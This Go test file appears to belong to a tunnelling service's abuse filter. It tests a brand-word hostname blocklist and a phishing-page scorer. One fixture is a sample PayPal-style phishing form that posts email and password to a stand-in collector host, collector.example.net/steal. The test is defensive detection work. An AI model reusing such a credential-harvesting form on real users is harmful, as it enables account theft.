package server

import "testing"

func TestHostnameAllowed(t *testing.T) {
	for label, blocked := range map[string]bool{
		"paypal-login":      true,
		"my-pay-pal":        true, // dashes are ignored for anywhere-words
		"secure-apple-id":   true,
		"pineapple-shop":    false, // "=apple" only matches a whole part
		"groups-api":        false, // "=ups" is part-only
		"ups-tracking":      true,
		"brave-otter-4821":  false,
		"metamask-recovery": true,
		"my-dev-server":     false,
		"googledocs-clone":  true,
	} {
		_, ok := hostnameAllowed(label, defaultBlockedWords)
		if ok == blocked {
			t.Errorf("hostnameAllowed(%q) allowed=%v, want blocked=%v", label, ok, blocked)
		}
	}
}

func TestPhishScore(t *testing.T) {
	phish := `<html><head><title>PayPal - Log in to your account</title></head><body>
		<h1>Verify your account</h1><p>We noticed unusual activity.</p>
		<form action="https://collector.example.net/steal" method="post">
		<input name="email"><input type="password" name="pw"></form></body></html>`
	if s, sig := phishScore(phish, "x.tund.io"); s < phishThreshold {
		t.Errorf("phishing page scored %d %v, want >= %d", s, sig, phishThreshold)
	}
	legit := `<html><head><title>Acme dashboard</title></head><body><h1>Sign in</h1>
		<form action="/login" method="post"><input name="user"><input type="password" name="pw">
		<button>Sign in with Google</button></form></body></html>`
	if s, sig := phishScore(legit, "x.tund.io"); s >= phishThreshold {
		t.Errorf("normal login page scored %d %v, want < %d", s, sig, phishThreshold)
	}
	if !containsWord("log in with paypal", "paypal") || containsWord("paypalish", "paypal") || containsWord("groups", "ups") {
		t.Error("containsWord boundaries")
	}
}
